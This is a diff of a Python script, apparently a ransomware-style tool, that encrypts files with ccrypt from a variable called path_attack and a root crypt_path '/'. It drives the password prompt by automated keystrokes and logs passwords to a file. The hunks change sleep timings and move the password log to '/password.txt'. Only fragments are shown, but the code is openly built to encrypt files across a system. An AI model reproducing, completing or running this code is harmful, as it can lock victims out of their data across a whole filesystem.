@@ -19,7 +19,7 @@ crypt_path = '/'       #Specified Path!!
 
 def multpy():
     threading.Thread(target=cy).start()
-    time.sleep(0.1)
+    time.sleep(0.2)
     threading.Thread(target=insert).start()
 
 #crypt
@@ -28,7 +28,7 @@ def insert():
         p.press('enter')
         p.write(password)
         p.press('enter')
-        with open(f'{crypt_path}/password.txt','a') as pwdfile:
+        with open('/password.txt','a') as pwdfile:                                      # SAFE PASSWORD IN '/'
             pwdfile.write('File Name: '+  file + '\nPassword File: ' +password+'\n\n')
 def cy():
   os.system('ccrypt -e ' + path_attack)
@@ -49,7 +49,7 @@ try:
                 console.print(f'Done File: ',style = base_style)   # Execute File
                 console.print(f"{file}", style= file_style)
                 print()                                                            # Start crypting process
-                time.sleep(0.4)
+                time.sleep(0.5)
                 os.system('clear')
 except:
     print("Don't work")
